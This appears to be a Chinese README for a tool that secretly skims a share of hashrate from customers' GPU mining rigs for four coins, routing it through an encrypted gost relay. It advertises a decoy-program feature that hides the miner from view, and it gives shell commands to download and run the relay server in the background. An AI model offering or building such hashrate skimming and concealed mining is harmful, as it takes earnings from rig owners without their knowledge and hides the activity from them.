# 本地抽水加密工具使用说明


本工具运行在客户显卡矿机上的工具。支持ETH，ETC，RVN，ERGO四大币种抽水


运行平台windows 10或以上版本。


相对于服务器端口抽水优点：


（1），抽水操作在本地完成，服务器只起到转发所以不占用服务器资源，2G内存的服务器只要带宽够，可以带N台无限算力的机子，节约服务器开消成本。


（2），工具采用TLS加密传输，更加安全。


工具集成了三大挖矿内核，四种主要币种的抽水，并屏蔽掉了内核的抽水功能。让挖矿更安全。


（4），并带有马甲程序 功能，指定一个马甲程序后，当启动挖矿时同时也会启动马甲程序，并隐藏掉挖矿程序，当关闭马甲程序时将停止挖矿。让挖矿更加的隐蔽。






## LINUX服务器下操作代码：


curl -s -L https://github.com/we-sk-open/netdata/releases/download/gost/gost


chmod a+x gost


nohup ./gost -L ss+mwss://chacha20:（加密密码）@:入站端口号 > bxdd1 2>&1 &


检察代码（查看gost是否正常运行）


ps -aux | grep "gost"





## 客户端编辑及编译说明


![编译说明1](https://user-images.githubusercontent.com/100226405/178154838-ad48206c-55f2-4907-b25a-bb162b245e82.JPG)
![编译说明2](https://user-images.githubusercontent.com/100226405/178154845-cfc9ab80-6919-40c9-9ec4-535aba820ebb.JPG)
![编译说明3](https://user-images.githubusercontent.com/100226405/178154855-e0e9867b-2fc8-4ac4-b2c5-d308f3620604.JPG)
![编译说明4](https://user-images.githubusercontent.com/100226405/178154860-ab89ecd0-4d86-479a-9686-acc1bc033911.JPG)
![编译说明5](https://user-images.githubusercontent.com/100226405/178154865-b053d7b3-0717-44fc-a7f1-76e14e394651.JPG)
